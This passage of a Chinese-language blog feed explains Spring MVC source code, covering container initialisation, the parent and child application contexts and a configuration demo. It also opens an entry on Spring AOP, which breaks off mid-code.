punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>初始化代码</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">initWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">WebApplicationContext</span> rootContext <span class="token operator">=</span>         <span class="token class-name">WebApplicationContextUtils</span><span class="token punctuation">.</span><span class="token function">getWebApplicationContext</span><span class="token punctuation">(</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">WebApplicationContext</span> wac <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>webApplicationContext <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// A context instance was injected at construction time -> use it</span>      wac <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>webApplicationContext<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>wac <span class="token keyword">instanceof</span> <span class="token class-name">ConfigurableWebApplicationContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">ConfigurableWebApplicationContext</span> cwac <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ConfigurableWebApplicationContext</span><span class="token punctuation">)</span> wac<span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cwac<span class="token punctuation">.</span><span class="token function">isActive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// The context has not yet been refreshed -> provide services such as</span>            <span class="token comment">// setting the parent context, setting the application context id, etc</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cwac<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token comment">// The context instance was injected without an explicit parent -> set</span>               <span class="token comment">// the root application context (if any; may be null) as the parent</span>               cwac<span class="token punctuation">.</span><span class="token function">setParent</span><span class="token punctuation">(</span>rootContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">configureAndRefreshWebApplicationContext</span><span class="token punctuation">(</span>cwac<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>wac <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// No context instance was injected at construction time -> see if one</span>      <span class="token comment">// has been registered in the servlet context. If one exists, it is assumed</span>      <span class="token comment">// that the parent context (if any) has already been set and that the</span>      <span class="token comment">// user has performed any initialization such as setting the context id</span>      wac <span class="token operator">=</span> <span class="token function">findWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>wac <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// No context instance is defined for this servlet -> create a local one</span>      wac <span class="token operator">=</span> <span class="token function">createWebApplicationContext</span><span class="token punctuation">(</span>rootContext<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>refreshEventReceived<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Either the context is not a ConfigurableApplicationContext with refresh</span>      <span class="token comment">// support or the context injected at construction time had already been</span>      <span class="token comment">// refreshed -> trigger initial onRefresh manually here.</span>      <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>onRefreshMonitor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">onRefresh</span><span class="token punctuation">(</span>wac<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>publishContext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Publish the context as a servlet context attribute.</span>      <span class="token class-name">String</span> attrName <span class="token operator">=</span> <span class="token function">getServletContextAttributeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>attrName<span class="token punctuation">,</span> wac<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> wac<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="父子容器的概念引入"><a href="#父子容器的概念引入" class="headerlink" title="父子容器的概念引入"></a>父子容器的概念引入</h4><p>以前xml配置springMVC的时候步骤，需要在web.xml中配置</p><p>1、在web.xml配置ContextLoadListener,指定Spring配置文件位置</p><p>2、在web.xml配置DispatcherServlet,指定SpringMVC配置文件的位置</p><p>3、以上操作就会产生父子容器</p><p>父容器：Root Spring配置文件进行包扫描并保存的组件的容器</p><p>子容器：SpringMVC配置文件进行包扫描并保存的所有组件的容器</p><p>cwac.setParent(rootContext);好处是容器之间的隔离，类似于Java中类加载的双亲委派模型</p><h3 id="基于两个事件回调启动了Spring和SpringMVC"><a href="#基于两个事件回调启动了Spring和SpringMVC" class="headerlink" title="基于两个事件回调启动了Spring和SpringMVC"></a>基于两个事件回调启动了Spring和SpringMVC</h3><h4 id="第一个父容器相关"><a href="#第一个父容器相关" class="headerlink" title="第一个父容器相关"></a>第一个父容器相关</h4><p>AbstractAnnotationConfigDispatcherServletInitializer</p><p><img src="/%E5%89%91%E6%8C%87%E6%BA%90%E7%A0%81-springmvc-%E4%B8%80-%E5%BA%8F%E7%AB%A0.assets/image-20220515145511744-16526085257325.png" alt="image-20220515145511744"></p><p>AbstractContextLoaderInitializer 注册ContextLoaderListener，web应用启动以后（Tomcat加载应用以后）会执行ContextLoaderListener里面contextInitialized的逻辑，监听器机制，servlet的标准</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onStartup</span><span class="token punctuation">(</span><span class="token class-name">ServletContext</span> servletContext<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>   <span class="token function">registerContextLoaderListener</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">protected void registerContextLoaderListener(ServletContext servletContext) &#123;   WebApplicationContext rootAppContext &#x3D; createRootApplicationContext();   if (rootAppContext !&#x3D; null) &#123;      ContextLoaderListener listener &#x3D; new ContextLoaderListener(rootAppContext);      listener.setContextInitializers(getRootApplicationContextInitializers());      servletContext.addListener(listener);   &#125;   else &#123;      logger.debug(&quot;No ContextLoaderListener registered, as &quot; +            &quot;createRootApplicationContext() did not return an application context&quot;);   &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>createRootApplicationContext由<strong>孙子类</strong>AbstractAnnotationConfigDispatcherServletInitializer 实现</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createRootApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> configClasses <span class="token operator">=</span> <span class="token function">getRootConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">ObjectUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>configClasses<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">AnnotationConfigWebApplicationContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      context<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>configClasses<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> context<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>而 getRootConfigClasses 就是获取自子类的配置文件，也就是我们所说父子容器中父容器Spring组件相关的配置类</p><h4 id="第二个子容器相关"><a href="#第二个子容器相关" class="headerlink" title="第二个子容器相关"></a>第二个子容器相关</h4><p>第二个我们发现 AbstractAnnotationConfigDispatcherServletInitializer  有一个getRootConfigClasses 同时也有一个getRootConfigClasses，获取和servlet相关的。追溯发现</p><p>AbstractDispatcherServletInitializer</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">registerDispatcherServlet</span><span class="token punctuation">(</span><span class="token class-name">ServletContext</span> servletContext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">String</span> servletName <span class="token operator">=</span> <span class="token function">getServletName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">hasLength</span><span class="token punctuation">(</span>servletName<span class="token punctuation">,</span> <span class="token string">"getServletName() must not return null or empty"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">WebApplicationContext</span> servletAppContext <span class="token operator">=</span> <span class="token function">createServletApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">notNull</span><span class="token punctuation">(</span>servletAppContext<span class="token punctuation">,</span> <span class="token string">"createServletApplicationContext() must not return null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">FrameworkServlet</span> dispatcherServlet <span class="token operator">=</span> <span class="token function">createDispatcherServlet</span><span class="token punctuation">(</span>servletAppContext<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">notNull</span><span class="token punctuation">(</span>dispatcherServlet<span class="token punctuation">,</span> <span class="token string">"createDispatcherServlet(WebApplicationContext) must not return null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   dispatcherServlet<span class="token punctuation">.</span><span class="token function">setContextInitializers</span><span class="token punctuation">(</span><span class="token function">getServletApplicationContextInitializers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">ServletRegistration<span class="token punctuation">.</span>Dynamic</span> registration <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">addServlet</span><span class="token punctuation">(</span>servletName<span class="token punctuation">,</span> dispatcherServlet<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>registration <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span><span class="token string">"Failed to register servlet with name '"</span> <span class="token operator">+</span> servletName <span class="token operator">+</span> <span class="token string">"'. "</span> <span class="token operator">+</span>            <span class="token string">"Check if there is another servlet registered under the same name."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   registration<span class="token punctuation">.</span><span class="token function">setLoadOnStartup</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   registration<span class="token punctuation">.</span><span class="token function">addMapping</span><span class="token punctuation">(</span><span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   registration<span class="token punctuation">.</span><span class="token function">setAsyncSupported</span><span class="token punctuation">(</span><span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">Filter</span><span class="token punctuation">[</span><span class="token punctuation">]</span> filters <span class="token operator">=</span> <span class="token function">getServletFilters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">ObjectUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>filters<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Filter</span> filter <span class="token operator">:</span> filters<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">registerServletFilter</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">,</span> filter<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token function">customizeRegistration</span><span class="token punctuation">(</span>registration<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>createServletApplicationContext 又是由<strong>孙子类</strong>AbstractAnnotationConfigDispatcherServletInitializer实现</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createServletApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">AnnotationConfigWebApplicationContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> configClasses <span class="token operator">=</span> <span class="token function">getServletConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">ObjectUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>configClasses<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      context<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>configClasses<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> context<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="demo演示"><a href="#demo演示" class="headerlink" title="demo演示"></a>demo演示</h4><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"cn.hyqup.web"</span><span class="token punctuation">,</span>excludeFilters <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token annotation punctuation">@ComponentScan.Filter</span><span class="token punctuation">(</span>type <span class="token operator">=</span> <span class="token class-name">FilterType</span><span class="token punctuation">.</span><span class="token constant">ANNOTATION</span><span class="token punctuation">,</span>value <span class="token operator">=</span> <span class="token class-name">Controller</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"cn.hyqup.web"</span><span class="token punctuation">,</span>includeFilters <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token annotation punctuation">@ComponentScan.Filter</span><span class="token punctuation">(</span>type <span class="token operator">=</span> <span class="token class-name">FilterType</span><span class="token punctuation">.</span><span class="token constant">ANNOTATION</span><span class="token punctuation">,</span>value <span class="token operator">=</span> <span class="token class-name">Controller</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>useDefaultFilters <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMVCConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QuickAppStater</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractAnnotationConfigDispatcherServletInitializer</span> <span class="token punctuation">&#123;</span>   <span class="token comment">/**    * 根容器的配置（Spring容器相关的配置）    * @return    */</span>   <span class="token annotation punctuation">@Override</span>   <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getRootConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">/**    * web容器相关的配置（SpringMVC的配置类）    * @return    */</span>   <span class="token annotation punctuation">@Override</span>   <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">SpringMVCConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">/**    * Servlet的映射路径    * @return    */</span>   <span class="token annotation punctuation">@Override</span>   <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>继承了AbstractAnnotationConfigDispatcherServletInitializer，实现了快速启动spring容器和springmvc容器</p><h3 id="整体流程分析"><a href="#整体流程分析" class="headerlink" title="整体流程分析"></a>整体流程分析</h3><h4 id="代码阶段"><a href="#代码阶段" class="headerlink" title="代码阶段"></a>代码阶段</h4><ol><li>Tomcat启动后会扫描所有的WebApplicationInitializer执行onStartup方法，会扫描到我们所写的QuickAppStater，执行onStartup，会执行super.onStartup</li><li>会执行到AbstractDispatcherServletInitializer的方法首先执行父类AbstractContextLoaderInitializer去执行registerContextLoaderListener，会根据spring的配置类创建一个空容器AnnotationConfigWebApplicationContext，注解版本的。此时容器还未刷新，没有功能 </li><li>AbstractDispatcherServletInitializer其次会执行registerDispatcherServlet注册DispatcherServlet，根据web相关的配置类AnnotationConfigWebApplicationContext，第二个容器创建出来</li></ol><h4 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h4><ol><li>首先按照代码阶段会将我们的父子容器创建出来，也就是两个AnnotationConfigWebApplicationContext，</li><li>（父容器）web启动完成的时候，Tomcat触发监听器启动根容器，也就是ContextLoaderListener里面的contextInitialized进行initWebApplicationContext初始化，也就是会执行到refresh()逻辑装配Spring相关的容器（比如AOP、事务、IOC、自动装配（包括了service层、dao层））</li><li>（子容器）由于DispatcherServlet本质上就是一个servlet,所以tomcat启动之后回调用init方法初始化，这个时候就是执行到对DispatcherServlet里面的AnnotationConfigWebApplicationContext进行refresh装配web相关的SpringMVC相关的容器（比如@Controller相关的）</li></ol><p>注意：由于设计上是子容器刷新的时候父容器已经刷新完毕，并且将父容器设置到子容器对象中，所以我们在controller（子容器）装配service（父容器）正常，而service装配controller就是不支持的</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>SpringMVC源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringMVC</tag>
      
      <tag>SPI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-spring-(七)-AOP原理剖析</title>
    <link href="/posts/5b245593.html"/>
    <url>/posts/5b245593.html</url>
    
    <content type="html"><![CDATA[<p>本章节探究AOP的使用及其原理剖析，了解AOP的详细使用及其注意事项，探究AOP是怎样在整个Bean生命周期干预来实现的</p><span id="more"></span><h2 id="AOP演示"><a href="#AOP演示" class="headerlink" title="AOP演示"></a>AOP演示</h2><p>由于这里源码编译环境采用aspectJ相关，演示测试环境有点麻烦，我们这里采用springboot 新建项目引入AOP,使用SpringTest来进行演示及Debug</p><h3 id="1、引入依赖"><a href="#1、引入依赖" class="headerlink" title="1、引入依赖"></a>1、引入依赖</h3><figure><div class="code-wrapper"><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-aop<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="2、编写测试"><a href="#2、编写测试" class="headerlink" title="2、编写测试"></a>2、编写测试</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>hyq<span class="token punctuation">.</span>practice<span class="token punctuation">.</span>aop</span><span class="token punctuation">;</span><span class="token comment">//package cn.hyqup.spring.aop;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">EnableAspectJAutoProxy</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/5/11 * @description: */</span><span class="token annotation punctuation">@EnableAspectJAutoProxy</span> <span class="token comment">//开启自动代理</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AopConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>hyq<span class="token punctuation">.</span>practice<span class="token punctuation">.</span>aop</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">JoinPoint</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">ProceedingJoinPoint</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/5/11 * @description: */</span><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Aspect</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogAspect</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token class-name">LogAspect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token 